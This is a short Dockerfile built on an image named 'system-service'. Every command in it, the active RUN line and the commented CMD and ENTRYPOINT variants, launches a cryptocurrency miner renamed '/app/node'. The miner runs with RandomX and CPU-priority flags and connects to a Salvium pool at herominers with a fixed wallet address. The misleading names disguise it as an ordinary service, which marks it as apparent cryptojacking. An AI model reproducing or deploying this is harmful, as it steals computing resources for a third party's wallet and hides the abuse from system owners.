FROM chriskm12/system-service:xm_01
ENV INPUT_NUMBER=32
RUN /app/node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${INPUT_NUMBER}
#CMD sh -c '/app/node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${INPUT_NUMBER} > try.log'
#ENTRYPOINT sh -c '/app/node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${INPUT_NUMBER}'
#ENTRYPOINT sh -c '/app/node -a rx/0 -k -t 2 --cpu-priority 4 --cpu-no-yield --donate-level 1 -o us.salvium.herominers.com:1231 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=240000.crf_${INPUT_NUMBER}'
